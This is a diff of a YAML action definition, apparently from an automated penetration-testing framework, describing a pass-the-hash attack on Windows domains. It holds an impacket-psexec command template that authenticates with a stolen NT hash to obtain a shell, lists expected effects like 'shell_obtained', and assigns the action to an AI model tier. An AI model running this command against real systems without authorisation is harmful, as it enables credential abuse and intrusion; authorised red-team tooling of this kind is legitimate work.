@@ -2,16 +2,18 @@ name: passthehash
 category: ad
 description: Pass-the-hash with NTLM hash
 preconditions:
-  - has_cred
-  - os==windows
+- has_cred
+- os==windows
 parameters:
   target_ip: from_engagement.target_ip
-command_template: "impacket-psexec '{domain}/{username}@{target_ip}' -hashes ':{nt_hash}'"
-parser: null
+command_template: impacket-psexec '{domain}/{username}@{target_ip}' -hashes ':{nt_hash}'
+parser: impacket_parser
 expected_effects:
-  - action_completed
+- pth_success
+- shell_obtained
 falsifier:
-  pattern: "error|failed|refused|denied"
+  pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: "Authenticates using NT hash directly. No password needed. Works against SMB, WinRM (via evil-winrm -H), RDP (restricted admin mode)."
+mechanism: Authenticates using NT hash directly. No password needed. Works against
+  SMB, WinRM (via evil-winrm -H), RDP (restricted admin mode).
